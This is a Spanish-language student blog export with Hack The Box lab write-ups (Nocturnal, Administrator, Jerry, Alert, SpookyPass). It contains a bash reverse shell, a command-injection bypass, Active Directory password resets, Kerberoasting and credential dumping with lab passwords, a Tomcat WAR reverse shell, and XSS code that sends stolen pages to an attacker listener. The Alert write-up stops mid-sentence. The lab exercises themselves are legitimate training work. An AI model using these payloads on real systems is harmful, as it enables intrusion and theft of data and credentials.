
[{"content":"","date":"11 mayo 2025","externalUrl":null,"permalink":"/tags/analisis-de-codigo/","section":"Tags","summary":"","title":"Analisis-De-Codigo","type":"tags"},{"content":"","date":"11 mayo 2025","externalUrl":null,"permalink":"/tags/caido/","section":"Tags","summary":"","title":"Caido","type":"tags"},{"content":"","date":"11 mayo 2025","externalUrl":null,"permalink":"/tags/cve/","section":"Tags","summary":"","title":"CVE","type":"tags"},{"content":"","date":"11 mayo 2025","externalUrl":null,"permalink":"/tags/cve-2023-46818/","section":"Tags","summary":"","title":"CVE-2023-46818","type":"tags"},{"content":"","date":"11 mayo 2025","externalUrl":null,"permalink":"/tags/ispconfig/","section":"Tags","summary":"","title":"ISPCONFIG","type":"tags"},{"content":"","date":"11 mayo 2025","externalUrl":null,"permalink":"/htb/maquinas/","section":"Hack The Box","summary":"","title":"M√°quinas","type":"htb"},{"content":"\rDescripci√≥n #\rUna maquina que aunque sencilla nos sirve para practicar algunas cosas esenciales como lo pueden ser la interceptaci√≥n de peticiones, el an√°lisis de c√≥digo y el port fowarding.\nEnumeraci√≥n #\rLo primero que siempre hacemos es enumerar los puertos que una maquina tiene abiertos para ello usamos el siguiente comando de nmap:\nsudo nmap -p- --open --min-rate 5000 -sS -Pn -n 10.10.11.64 -oG allPorts -p-: Escanea todos los puertos (1-65535). ‚Äìopen: Solo muestra los puertos abiertos. ‚Äìmin-rate 5000: Establece una tasa m√≠nima de paquetes por segundo. sS: Realiza un escaneo SYN ‚Äúsigiloso‚Äù. Pn: No hace ping (asume que el host est√° activo). n: No realiza resoluci√≥n DNS. oG allPorts: Guarda la salida en formato grepeable en el archivo allPorts. Con esto podremos ver que esta el puerto 80 abierto por lo que vamos a intentar ver brevemente la pagina web que esta en el puerto ya que este corresponde al servicio http , para esto vamos a usar whatweb :\nwhatweb 10.10.11.64 Vemos que esta corriendo en Ubuntu y que tiene un redireccionamiento hacia nocturnal.htb por lo que lo vamos a agregar al /etc/hosts .\nsudo nano /etc/hosts Despu√©s de haber hecho esto vamos a usar nmap para hacer un escaneo mas a fondo de los dos puertos que nos mostro abiertos el 22 y el 80.\nnmap -p22,80 -sVC -A 10.10.11.64 -oN target p22,80: Escanea espec√≠ficamente los puertos 22 y 80. sVC: Combina las opciones -sV (detecci√≥n de versi√≥n) y -sC (scripts por defecto). A: Habilita la detecci√≥n de OS, versiones, scripts y traceroute. oN target: Guarda la salida en formato normal en el archivo target. Puerto 80 #\rEncontraremos una pagina bastante simple que al parecer nos permite primero que todo registrarnos e iniciar sesi√≥n, la funcionalidad de la pagina es cargar y ver archivos Word, Excel y PDF lo primero que podemos probar es ingresar con usuarios y contrase√±as predecibles, pero no nos funcionara por lo que nos crearemos una cuenta.\nAl momento de iniciar sesi√≥n con nuestra cuenta nos mostrara la pagina para subir los archivos y presuntamente visualizarlos, si indagar mucho ahora sabemos que esta usando php de fondo debido a la URL que nos muestra:\nCon este conocimiento vamos a tratar de hallar subdominios y subdirectorios para ello vamos a usar gobuster y los diccionarios de seclists :\ngobuster dir -u http://nocturnal.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt --no-error -t 200 -x php Con este comando estamos probando cada palabra en el diccionario como un subdirectorio adem√°s de esto tambi√©n probamos agreg√°ndole la extensi√≥n .php todo esto usando 200 hilos gracias al par√°metro -t , lo que nos mostrara el comando ser√° lo siguiente:\ngobuster vhost -u http://nocturnal.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -t 200 --append-domain --no-error -r Para hallar subdominios el comando cambia un poco pero es bastante similar pero de este no obtendremos ning√∫n resultado.\nVolviendo a la carga de archivos podemos subir el archivo y descargarlo:\nSi interceptamos esta solicitud para descargar el archivo con caido veremos lo siguiente:\nSi lo mandamos al replay usando el comando ctrl+r y enviamos la solicitud para ver cual es la respuesta tendremos lo siguiente:\nSi cambiamos el archivo nos dir√° que no existe dicho archivo pero a√∫n mas interesante es que si cambiamos el usuario nos dice que el usuario no existe de esta forma tenemos un camino posible para listar usuarios, que es lo que vamos a hacer con caido usando un diccionario:\nLo primero que vamos a hacer es clic derecho sobre nuestra request y vamos a mandarla a Automate luego de hacer esto vamos a seleccionar el usuario que enviamos en nuestra petici√≥n y le vamos a dar al siguiente s√≠mbolo mas:\nLo siguiente que vamos a hacer es dirigirnos a la pesta√±a Files y subir un diccionario de usuario como por ejemplo el que esta en la ruta /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt .\nVolvemos a la pesta√±a Automate y en la payload ponemos el archivo que acabamos de subir y ponemos a correr la fuerza bruta con Run .\nDespu√©s de esto nos van a quedar bastantes solicitudes pero podremos observar un patr√≥n por lo que lo podemos filtrar de la siguiente forma:\nLo que hicimos fue filtrar por la longitud de la respuesta siempre que fuera diferente a 3268 nos iba a mostrar el resultado y aqu√≠ vemos 3 opciones admin amanda y jhon por lo que pudimos realizar de forma exitosa el descubrimiento de usuarios.\nSi volvemos a la pesta√±a de replay y cambiamos el usuario a amanda veremos los archivos que tiene disponibles para descargar entre ellos uno llamado privacy.odt:\nSi iniciamos sesi√≥n en la pagina y entramos el siguiente link en el navegador podremos descargar este archivo y revisarlo http://nocturnal.htb/view.php?username=amanda\u0026amp;file=privacy.odt .\nSi abrimos el archivo mediante el explorador de archivos que tiene Kali podremos ver que hay diferentes archivos dentro revisando cada uno de ellos encontramos la contrase√±a de amanda en el archivo llamado content.xml .\nPanel admin #\rYa con las credenciales de amandapodemos entrar al panel de administrador de la pagina donde se encuentra expuesta toda la l√≥gica de la pagina mediante los archivos de su backend entre ellos podemos ver como esta listando los archivos de extensi√≥n php con el siguiente codigo:\nfunction listPhpFiles($dir) { $files = array_diff(scandir($dir), [\u0026#39;.\u0026#39;, \u0026#39;..\u0026#39;]); echo \u0026#34;\u0026lt;ul class=\u0026#39;file-list\u0026#39;\u0026gt;\u0026#34;; foreach ($files as $file) { $sanitizedFile = sanitizeFilePath($file); if (is_dir($dir . \u0026#39;/\u0026#39; . $sanitizedFile)) { // Recursively call to list files inside directories echo \u0026#34;\u0026lt;li class=\u0026#39;folder\u0026#39;\u0026gt;üìÅ \u0026lt;strong\u0026gt;\u0026#34; . htmlspecialchars($sanitizedFile) . \u0026#34;\u0026lt;/strong\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;ul\u0026gt;\u0026#34;; listPhpFiles($dir . \u0026#39;/\u0026#39; . $sanitizedFile); echo \u0026#34;\u0026lt;/ul\u0026gt;\u0026lt;/li\u0026gt;\u0026#34;; } else if (pathinfo($sanitizedFile, PATHINFO_EXTENSION) === \u0026#39;php\u0026#39;) { // Show only PHP files echo \u0026#34;\u0026lt;li class=\u0026#39;file\u0026#39;\u0026gt;üìÑ \u0026lt;a href=\u0026#39;admin.php?view=\u0026#34; . urlencode($sanitizedFile) . \u0026#34;\u0026#39;\u0026gt;\u0026#34; . htmlspecialchars($sanitizedFile) . \u0026#34;\u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt;\u0026#34;; } } echo \u0026#34;\u0026lt;/ul\u0026gt;\u0026#34;; } Tambi√©n hay un intento de sanitizar las entradas:\nfunction cleanEntry($entry) { $blacklist_chars = [\u0026#39;;\u0026#39;, \u0026#39;\u0026amp;\u0026#39;, \u0026#39;|\u0026#39;, \u0026#39;$\u0026#39;, \u0026#39; \u0026#39;, \u0026#39;`\u0026#39;, \u0026#39;{\u0026#39;, \u0026#39;}\u0026#39;, \u0026#39;\u0026amp;\u0026amp;\u0026#39;]; foreach ($blacklist_chars as $char) { if (strpos($entry, $char) !== false) { return false; // Malicious input detected } } return htmlspecialchars($entry, ENT_QUOTES, \u0026#39;UTF-8\u0026#39;); } Pero no limpia las entradas como nueva l√≠neas %0a y \\n o el tab horizontal %09 y \\t , y aqu√≠ es donde entra la vulnerabilidad en el sistema de backups de la pagina, la cual crea una Shell de comandos, si interceptamos la petici√≥n para crear el backup veremos lo siguiente:\nPor lo que teniendo conocimiento de las entradas que no limpia podemos intentar inyectar de alguna forma comandos, como lo es la siguiente:\nCon esto en conocimiento podemos tratar de montar una revshell, de la siguiente manera vamos a crear un archivo llamado revshell.sh con el siguiente contenido:\nsh -i \u0026gt;\u0026amp; /dev/tcp/IP/4444 0\u0026gt;\u0026amp;1 # En consola vamos a ejecutar el siguiente comando: python3 -m http.server Y ya lo siguiente seria con la petici√≥n que hab√≠amos interceptado, de modo que vamos a descargar la rever Shell que tenemos en nuestra maquina y la vamos a ejecutar con bash:\nUser #\rRevisando los archivos dentro del directorio /var/www/ encontramos una base de datos Sqlite3 su ruta exacta es /var/www/nocturnal_database/nocturnal_database.db de modo que si la abrimos con sqllite3 podemos hallar los hashes de varios usuarios:\nSi nos dirigimos a la pagina de crackstation podremos romper dos de estos hashes:\nSi nos conectamos por ssh al usuario tobias tendremos la flag de usuario.\nRoot #\rYa desde este punto lo primero que vamos a mirar son las mismas posibilidades para el escalamiento de privilegios de siempre como los permisos sudo o las crontabs; en este caso no hay permisos de ejecutar sudo ni hay una crontab que nos sirva, por lo que revisamos los puertos locales con el siguiente comando:\nss -lantp Podemos observar un puerto 8080 en escucha entonces lo vamos a intentar montar con un port forwarding :\nssh -L {port}:localhost:8080 tobias@nocturnal.htb # Asegurate de que el puerto que vayas a usar no este en uso Ya con esto podremos ingresar al servicio desde nuestro navegador:\nSi probamos diferentes combinaciones con las credenciales que ya ten√≠amos resulta que el usuario y la contrase√±a son admin:slowmotionapocalypse y con esto podemos ingresar en la secci√≥n de ayuda encontraremos la versi√≥n del ispconfig la cual podremos buscar para explotar alguna vulnerabilidad.\nhttps://github.com/ajdumanhug/CVE-2023-46818\nEncontramos este repositorio en GitHub que nos ayuda a conseguir una Shell mediante una inyecci√≥n en base64 al archivo language_edit.php , si lo ejecutamos proporcionando el usuario la contrase√±a y la URL para iniciar sesi√≥n podremos obtener una Shell:\nY con esto seremos root y tendremos la ultima flag.\n","date":"11 mayo 2025","externalUrl":null,"permalink":"/htb/maquinas/nocturnal/","section":"Hack The Box","summary":"","title":"Nocturnal","type":"maquinas"},{"content":"","date":"11 mayo 2025","externalUrl":null,"permalink":"/tags/port-forwarding/","section":"Tags","summary":"","title":"Port Forwarding","type":"tags"},{"content":"Soy estudiante de Ingenier√≠a de Sistemas en la Universidad Distrital Francisco Jos√© de Caldas, en Bogot√°, Colombia. Actualmente curso el quinto semestre, con un fuerte interes en el Ethical Hacking.\nHabilidades #\rCiberseguridad: Conocimiento en t√©cnicas de penetraci√≥n, an√°lisis de vulnerabilidades y respuesta ante incidentes.\nProgramaci√≥n: Competencia en lenguajes como Python y Bash para la automatizaci√≥n de tareas y desarrollo de herramientas.\nTrabajo en equipo: Experiencia en colaboraci√≥n con grupos multidisciplinarios en proyectos de seguridad.\nProyectos Destacados #\rMeetups HTB #\rHe colaborado en la organizaci√≥n y facilitaci√≥n de meetups de Hack The Box, donde he:\nFacilitado sesiones de resoluci√≥n de retos: Guiando a los participantes a trav√©s de desaf√≠os pr√°cticos, promoviendo el aprendizaje colaborativo.\nOrganizado eventos de networking: Fomentando la interacci√≥n entre profesionales y entusiastas de la ciberseguridad.\nPresentado temas especializados: Compartiendo conocimientos sobre t√©cnicas y herramientas de seguridad.\nEstas experiencias me han permitido fortalecer mis habilidades de comunicaci√≥n, liderazgo y trabajo en equipo.\nParticipaci√≥n en Grupos #\rGisac #\rMi involucramiento con el Grupo de Intercambio de Seguridad y Ciberseguridad (Gisac) ha jugado un papel esencial en mi crecimiento profesional y personal. Desde que me un√≠ a este grupo, he tenido la oportunidad de interactuar con una comunidad de personas apasionadas por la ciberseguridad, lo que ha enriquecido profundamente mis conocimientos y habilidades.\nAl compartir experiencias y conocimientos con los miembros de Gisac, he podido aprender de personas con diferentes niveles de experiencia, lo que ha fomentado mi desarrollo tanto en aspectos t√©cnicos como en habilidades interpersonales. Esta interacci√≥n constante me ha permitido expandir mi perspectiva sobre el panorama de la seguridad inform√°tica, y fortalecer mi capacidad para abordar problemas complejos de forma colaborativa.\nUno de los aspectos m√°s valiosos de mi participaci√≥n ha sido asistir a diferentes eventos, como el JCUN 2024, que me brindaron la oportunidad de conectar con expertos en el campo y de participar en discusiones sobre las √∫ltimas tendencias en ciberseguridad. Estos eventos no solo han contribuido al aumento de mi base de conocimientos, sino que tambi√©n me han permitido entender la importancia de la actualizaci√≥n constante en este campo tan din√°mico.\n","date":"11 mayo 2025","externalUrl":null,"permalink":"/","section":"Santiago Chavarro","summary":"","title":"Santiago Chavarro","type":"page"},{"content":"","date":"11 mayo 2025","externalUrl":null,"permalink":"/tags/sqlite3/","section":"Tags","summary":"","title":"Sqlite3","type":"tags"},{"content":"","date":"11 mayo 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"\rEnumeraci√≥n #\rsudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.42 -oG allPorts nmap -sCV -p21,53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49668,59464,59475,59480,59483,59502,64101 10.10.11.42 -oN target Con cualquiera de los siguientes dos comandos podemos identificar de diferentes maneras los usuarios que hay en la m√°quina.\ncrackmapexec smb 10.10.11.42 -u \u0026#39;Olivia\u0026#39; -p \u0026#39;ichliebedich\u0026#39; -d Administrator.htb --rid-brute nxc smb 10.10.11.42 -u Olivia -p ichliebedich --users Vamos a listar las configuraciones y los protocolos que se aplican a la m√°quina con el comando:\nnxc smb 10.10.11.42 -u olivia -p ichliebedich --pass-pol La enumeraci√≥n de la pol√≠tica de contrase√±as muestra que la longitud m√≠nima de la contrase√±a es de 7 caracteres, la complejidad de la contrase√±a est√° desactivada (lo que significa que los usuarios pueden elegir contrase√±as cortas y d√©biles) y, lo m√°s importante, la opci√≥n Account Lockout Threshold est√° desactivada, lo que significa que podemos forzar la cuenta sin temer que se quede bloqueada.\nBloodhund #\rVamos a usar una herramienta llamada BloodHound que nos va a ayudar a encontrar vulnerabilidades para saltar de un usuario a otro y, finalmente, hacer el escalamiento de privilegios. Para instalarla y configurarla, sigue este paso a paso https://www.kali.org/tools/bloodhound/.\nbloodhound-python -u olivia -p ichliebedich -ns 10.10.11.42 -d administrator.htb -c all Despu√©s de subir los archivos que nos gener√≥ el comando y buscar al usuario al cual tenemos acceso, podemos ver que en Outbound Object Control tenemos la opci√≥n de saltar a otro usuario, en este caso michael@administrator.htb, y de este a benjamin@administrator.htb.\nDado esto, vemos que tenemos privilegios GenericAll, lo que nos permite realizar un Force Change Password, que es lo que vamos a intentar.\nnet rpc password michael \u0026#34;newpass\u0026#34; -U administrator.htb/olivia%ichliebedich -S administrator.htb pth-net rpc password michael \u0026#34;newpass\u0026#34; -U administrator.htb/Olivia%ffffffffffffffffffffffffffffffff:FBAA3E2294376DC0F5AEB6B41FFA52B7 -S administrator.htb El hash FBAA3E2294376DC0F5AEB6B41FFA52B7 sali√≥ de pasarle la contrase√±a de Olivia a este algoritmo de hash https://www.browserling.com/tools/ntlm-hash\nCon esto, hemos cambiado la contrase√±a de Michael y procederemos a saltar al usuario Benjamin, lo cual sigue el mismo proceso, pero cambiando las credenciales.\nnet rpc password benjamin \u0026#34;newpass\u0026#34; -U administrator.htb/michael%\u0026#34;passmichael\u0026#34; -S administrator.htb pth-net rpc password benjamin 11030221 -U administrator.htb/michael%ffffffffffffffffffffffffffffffff:\u0026#34;hashmichael\u0026#34; -S administrator.htb Luego de esto, nos vamos a conectar por FTP como Benjamin y descargar un archivo que est√° en el directorio en el que ingresamos con el comando get.\nftp 10.10.11.42@benjamin get Backup.psafe3 User #\rSi investigamos un poco, nos daremos cuenta de que es un hash y que lo podemos descifrar con Hashcat.\nhashcat -m 5200 -a 0 Backup.psafe3 /usr/share/wordlist/rockyou.txt --force Con la contrase√±a que nos dej√≥ el hash, vamos a abrir el psafe3.\npwsafe Backup.psafe3 Con las contrase√±as del archivo podemos ingresar como emily para obtener la flag de usuario.\nRoot #\rEn BloodHound vemos que el √∫nico de los tres usuarios que conseguimos puede hacer algo, y ese es Emily. Entonces, vamos a seguir lo que nos dice para un Targeted Kerberoast aunque tambien lo podriamos hacer con Netexec.\nfaketime \u0026#34;$(ntpdate -q administrator.htb | cut -d \u0026#39; \u0026#39; -f 1,2)\u0026#34; python3 targetedKerberoast.py -v -d administrator.htb -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb faketime \u0026#34;$(ntpdate -q administrator.htb | cut -d \u0026#39; \u0026#39; -f 1,2)\u0026#34; nxc ldap 10.10.11.42 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb --kerberoasting output.txt Esto nos deja un hash Kerberos 5 que podemos descifrar con Hashcat, y esa contrase√±a es la de Ethan.\nhashcat -m13100 output.txt /usr/share/wordlist/rockyou.txt Si miramos a qu√© grupos pertenece en BloodHound, podemos ver que pertenece al grupo de Domain Controllers.\nSi buscamos durante un rato, podemos encontrar que podemos escalar privilegios mediante un Credential Dumping https://redcanary.com/threat-detection-report/techniques/os-credential-dumping/, y lo podemos hacer con alguno de los siguientes comandos:\nimpacket-secretsdump -dc-ip 10.10.11.42 administrator.htb/ethan:limpbizkit@10.10.11.42 Esto nos va a mostrar los hashes de todos los usuarios, pero el que nos interesa es el del usuario Administrator. Entonces, con ese hash, vamos a iniciar sesi√≥n.\nevil-winrm -u administrator -H 3dc553ce4b9fd20bd016e098d2d2fd2e -i 10.10.11.42 ","date":"19 abril 2025","externalUrl":null,"permalink":"/htb/maquinas/administrator/","section":"Hack The Box","summary":"","title":"Administrator","type":"maquinas"},{"content":"","date":"19 abril 2025","externalUrl":null,"permalink":"/tags/bloodhund/","section":"Tags","summary":"","title":"BloodHund","type":"tags"},{"content":"","date":"19 abril 2025","externalUrl":null,"permalink":"/tags/dumping-de-credenciales/","section":"Tags","summary":"","title":"Dumping-De-Credenciales","type":"tags"},{"content":"","date":"19 abril 2025","externalUrl":null,"permalink":"/tags/windows/","section":"Tags","summary":"","title":"Windows","type":"tags"},{"content":"","date":"29 marzo 2025","externalUrl":null,"permalink":"/htb/challenges/","section":"Hack The Box","summary":"","title":"Challenges","type":"htb"},{"content":"","date":"29 marzo 2025","externalUrl":null,"permalink":"/tags/ghidra/","section":"Tags","summary":"","title":"Ghidra","type":"tags"},{"content":"","date":"29 marzo 2025","externalUrl":null,"permalink":"/tags/ltrace/","section":"Tags","summary":"","title":"Ltrace","type":"tags"},{"content":"","date":"29 marzo 2025","externalUrl":null,"permalink":"/tags/radar2/","section":"Tags","summary":"","title":"Radar2","type":"tags"},{"content":"","date":"29 marzo 2025","externalUrl":null,"permalink":"/tags/reversing/","section":"Tags","summary":"","title":"Reversing","type":"tags"},{"content":"En este caso vamos a resolver un reto de reversing bastante sencillo que se puede resolver de diferentes formas.\nDespu√©s de descargar el archivo ZIP y descomprimirlo encontraremos un ejecutable de Linux que si tratamos de ejecutar nos pedir√° aun contrase√±a por lo que ya podemos pensar que nuestra tarea va a ser encontrar esta contrase√±a a continuaci√≥n mostraremos tres formas diferentes de hacerlo:\nLtrace #\rSi el ejecutable nos esta pidiendo una contrase√±a lo primero que tenemos que analizar es que esta contrase√±a esta en el ejecutable y adem√°s lo esta comparando con el input del usuario por lo que usando ltrace vamos a interceptar llamadas a funciones de bibliotecas compartidas depurando as√≠ la ejecuci√≥n de la aplicaci√≥n:\nVemos que esta comparando nuestro input con la cadena s3cr3t_p455_f0r_gh05t5_4nd_gh0ul pero si tratamos de ingresar esto como contrase√±a nos dir√° que es err√≥nea lo que podemos hacer es verificar las cadenas en texto claro del ejecutable usando strings de la siguiente forma:\nPor lo que nos estaba faltando un ultimo car√°cter que es el 5 ya si ingresamos esto podremos ver la flag para entregar en Hack The Box.\nRadare2 y Ghidra #\rSi bien son herramientas diferentes consisten en lo mismo en este caso, vamos a analizar la funci√≥n main del archivo y encontrar la comparaci√≥n que hacen con nuestro input. Primero lo vamos a hacer con radare2 y ya despu√©s mostraremos ghidra.\nAc√° lo que estamos haciendo es mirar las funciones existentes en el ejecutable donde podemos observar esta el main incluido por lo que lo vamos a revisar mas a fondo de la siguiente manera:\nLo que hace esto es mostrarnos que esta haciendo el ejecutable a mas bajo nivel y si miramos un poco encontraremos tanto la flag como la contrase√±a entre la salida que nos mostro el comando pdf @main .\nPara ghidra toca hacer unos cuantos pasos mas pero podemos ver con mayor claridad esto, vamos a abrir la aplicaci√≥n y vamos a crear un nuevo proyecto despu√©s de esto vamos a importar el ejecutable que descargamos de la pagina de Hack The Box, luego de esto vamos a arrastrar ese ejecutable al s√≠mbolo de drag√≥n que hay arriba a la izquierda:\nYa con esto a la izquierda veremos un √°rbol de funciones por lo que si ingresamos a main veremos la contrase√±a de esta forma:\n","date":"29 marzo 2025","externalUrl":null,"permalink":"/htb/challenges/spookypass/","section":"Hack The Box","summary":"","title":"SpookyPass","type":"challenges"},{"content":"\rDescripci√≥n: #\rMaquina bastante sencilla que nos pide utilizar unas credenciales predeterminadas para explotar la carga y ejecucion de archivos war en tomcat\nEnumeraci√≥n #\rLo primero que vamos a hacer en esta maquina despu√©s de conectarnos a la VPN es mandar los siguientes dos comandos de nmap con el fin de identificar los puertos abiertos y los servicios junto con sus versiones de estos puertos:\nsudo nmap -p- --open --min-rate 5000 -sS -Pn -n 10.129.8.202 -oG allPorts #El segundo comando se envia especificando los puertos que el primero nos mostro abiertos #En este caso solo nos mostro el puerto 8080 nmap -p8080 -sVC -A {IP} -oN target Con el primer comando vamos a hacer un escaneo r√°pido principalmente porque con el segundo ser√° mas exhaustivo lo que hace el primer comando es:\nsudo nmap -p- \u0026ndash;open \u0026ndash;min-rate 5000 -sS -Pn -n 10.129.8.202 -oG allPorts -p-: Escanea todos los puertos (1-65535). \u0026ndash;open: Solo muestra los puertos abiertos. \u0026ndash;min-rate 5000: Establece una tasa m√≠nima de paquetes por segundo. -sS: Realiza un escaneo SYN \u0026ldquo;sigiloso\u0026rdquo;. -Pn: No hace ping (asume que el host est√° activo). -n: No realiza resoluci√≥n DNS. -oG allPorts: Guarda la salida en formato grepeable en el archivo allPorts. Mientras que el segundo escaneo hace esto:\nnmap -p8080 -sVC -A {IP} -oN target -p8080: Escanea espec√≠ficamente el puerto 8080. -sVC: Combina las opciones -sV (detecci√≥n de versi√≥n) y -sC (scripts por defecto). -A: Habilita la detecci√≥n de OS, versiones, scripts y traceroute. -oN target: Guarda la salida en formato normal en el archivo target. Despues de ejecutar estos dos podremos ver la siguiente salida:\nLo √∫nico que podemos ver con esto es que en el puerto 8080 esta corriendo un servicio http que esta usando Apache Tomcat .\nPuerto 8080 #\rAl ingresar a la pagina especificando en el navegador la IP y el puerto veremos esta pagina muy sencilla, si buscamos un poco lo √∫nico interesante que tendremos es el ‚ÄúManager App‚Äù que nos pide usuario y contrase√±a, haciendo una r√°pida b√∫squeda de credenciales predeterminadas de apache encontramos varias probando nos daremos cuenta que funcionan tomcat:s3cret por lo que tendremos acceso a ‚ÄúManager App‚Äù:\nSi leemos un poco lo que dice nos podremos dar cuenta que podemos subir y desplegar archivos WAR en la pagina.\nExplotaci√≥n #\rSi buscamos como explotar un archivo WAR en Tomcat podremos hallar la siguiente pagina la cual nos explica como crear un archivo con una Shell reversa que podremos usar para conectarnos a la maquina Hack Tricks.\nVamos a hacer el paso a paso para poder acceder a la maquina:\n#Crear el archivo infectado git clone https://github.com/mgeeky/tomcatWarDeployer.git cd tomcatWarDeployer python3 tomcatWarDeployer.py -U \u0026lt;username\u0026gt; -P \u0026lt;password\u0026gt; -H \u0026lt;ATTACKER_IP\u0026gt; -p \u0026lt;ATTACKER_PORT\u0026gt; \u0026lt;VICTIM_IP\u0026gt;:\u0026lt;VICTIM_PORT\u0026gt;/manager/html/ #Ponernos en escucha por el puerto 4444 nc -lvnp 4444 Despu√©s de ejecutar estos comandos vamos a entrar a la pagina y subir el archivo para posteriormente oprimir el bot√≥n Deploy .\nUna vez hagamos esto nos deber√≠a aparecer algo parecido a lo siguiente:\nVamos a darle al bot√≥n Reload de la aplicaci√≥n revshell con esto habremos ingresado a la maquina ya para obtener las dos flags para Hack The Box nos dirigiremos a:\nC:\\Users\\Administrator\\Desktop\\flags\n","date":"27 marzo 2025","externalUrl":null,"permalink":"/htb/maquinas/jerry/","section":"Hack The Box","summary":"","title":"Jerry","type":"maquinas"},{"content":"","date":"27 marzo 2025","externalUrl":null,"permalink":"/tags/tomcat/","section":"Tags","summary":"","title":"Tomcat","type":"tags"},{"content":"","date":"27 marzo 2025","externalUrl":null,"permalink":"/tags/war-file/","section":"Tags","summary":"","title":"WAR-File","type":"tags"},{"content":"\rDescripci√≥n: #\rMaquina en la cual se encuentra una visualizador de archivos Markdowns, vulnerable a xss cross site scripting, mediante una opcion para compartir los archivos .md subimos un codigo con la intencion de hacer un phishing y contactar con el administrador para enumerar informaci√≥n sensible.\nYa con un usuario y contrase√±a se realiza un escalamiento de privilegios mediante un port forwarding debido a un servicio que estaba corriendo como root.\nEnumeraci√≥n #\rCon nmap vamos a revisar que puertos estan abiertos y que servicios estan corriendo.\nsudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.36.72 -oG allPorts nmap -sCV -p22,80 10.129.36.72 -oN target Podemos ver que en el puerto 80, en la segunda l√≠nea, nos aparece la URL del servicio HTTP, por lo que la vamos a agregar al archivo /etc/hosts junto con la IP para poder abrir la p√°gina.\nsudo nano /etc/hosts Vamos a buscar subdominios con un c√≥digo de estado diferente a 301 utilizando la herramienta wfuzz.\nwfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H \u0026#34;Host: FUZZ.alert.htb\u0026#34; http://alert.htb/ | grep -v \u0026#34;301\u0026#34; Vemos que encontramos un subdominio, el cual tambi√©n se debe agregar al archivo /etc/hosts como statistics.alert.htb.\nEn la p√°gina que est√° en el puerto 80, podemos subir archivos Markdown (.md) y enviar una solicitud al administrador.\nEn el subdominio nos pide una contrase√±a y no podemos ingrasar\nDespu√©s de buscar, encontramos que podemos ejecutar algunas acciones mediante el archivo Markdown. Adem√°s, si subimos el archivo y oprimimos el bot√≥n de compartir, podemos enviarle el enlace del archivo a alguien mas.\nPodemos comprobar que funciona con una alert en JavaScript:\n\u0026lt;!-- XSS with regular tags --\u0026gt; \u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt; \u0026lt;img src=x onerror=alert(1) /\u0026gt; Explotaci√≥n xss #\rPodemos probar a obtener informaci√≥n de una de las rutas a las cuales no tenemos acceso, como messages.\n\u0026lt;script\u0026gt; fetch(\u0026#34;http://alert.htb/messages/\u0026#34;) // Realiza la solicitud GET .then(response =\u0026gt; response.text()) // Convierte la respuesta en texto .then(data =\u0026gt; { // Luego, realiza la solicitud POST con los datos obtenidos return fetch(\u0026#34;http://IP:4444/\u0026#34;, { method: \u0026#34;POST\u0026#34;, body: data // Envia los datos obtenidos en el cuerpo de la solicitud POST }); }) .then(response =\u0026gt; response.text()) // Espera la respuesta de la solicitud POST .then(result =\u0026gt; { console.log(result); // Muestra la respuesta de la solicitud POST }) .catch(error =\u0026gt; { console.error(\u0026#39;Error:\u0026#39;, error); // Maneja errores de las solicitudes }); \u0026lt;/script\u0026gt; Lo que vamos a hacer es intentar que el administrador abra el archivo por nosotros y nos env√≠e el contenido, utilizando el c√≥digo anterior y con nc recibir la respuesta.\nDespu√©s de subir el archivo, lo que hacemos es darle a \u0026lsquo;Compartir\u0026rsquo; y copiar la URL para luego preparar Netcat y enviar la solicitud al administrador.\nnc -lvnp 4444 Pero nos indica lo mismo: que no tenemos permisos.\nSi buscamos en Google archivos de configuraci√≥n predeterminados para un servidor Apache, encontramos la siguiente ruta: /etc/apache2/sites-enabled/000-default.conf. Entonces, vamos a repetir lo anterior, cambiando la ruta por un archivo PHP llamado messages.php, seguido del archivo de configuraci√≥n.\n\u0026lt;script\u0026gt; fetch(\u0026#34;http://alert.htb/messages.php?file=../../../../../../../../etc/apache2/sites-enabled/000-default.conf\u0026#34;) // Realiza la solicitud GET .then(response =\u0026gt; response.text()) // Convierte la respuesta en texto .then(data =\u0026gt; { // Luego, realiza la solicitud POST con los datos obtenidos return fetch(\u0026#34;http://IP:4444/\u0026#34;, { method: \u0026#34;POST\u0026#34;, body: data // Envia los datos obtenidos en el cuerpo de la solicitud POST }); }) .then(response =\u0026gt; response.text()) // Espera la respuesta de la solicitud POST .then(result =\u0026gt; { console.log(result); // Muestra la respuesta de la solicitud POST }) .catch(error =\u0026gt; { console.error(\u0026#39;Error:\u0026#39;, error); // Maneja errores de las solicitudes }); \u0026lt;/script\u0026gt; Vemos que hay una ruta a lo que podr√≠a ser un archivo con contrase√±as llamado .htpasswd. Entonces, vamos a hacer el mismo proceso, pero con este nuevo archivo: http://alert.htb/messages.php?file=../../../var/www/statistics.alert.htb/.htpasswd\nY recibimos un archivo en el que, al parecer, est√° un usuario con su hash. Si quieren saber qu√© tipo de hash es, pueden buscar \u0026lsquo;Hash Identifier\u0026rsquo; y pegarlo, para descifrarlo vamos a usar el siguiente comando:\n# Comando para hashcat hashcat -m 1600 -a 0 pass.txt /usr/share/wordlists/rockyou.txt # Comando para John john --format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt hash.txt Y obtenemos la contrase√±a del usuario Albert.\nRoot #\rNos conectamos como Albert mediante SSH.\nssh albert@IP Ya estando dentro del sistema, podemos observar dos cosas. Si usamos el comando id, veremos que nuestro usuario pertenece a un grupo peculiar: uid=1000(albert), gid=1000(albert), groups=1000(albert), 1001(management).\nHaciendo uso del siguiente comando, podremos buscar todos los archivos que tengan que ver con dicho grupo en espec√≠fico.\nfind / -type f -group management 2\u0026gt;/dev/null La salida del comando anterior nos reporta que nuestro usuario tiene permisos completos en /opt/website-monitor/config/configuration.php.\nPor 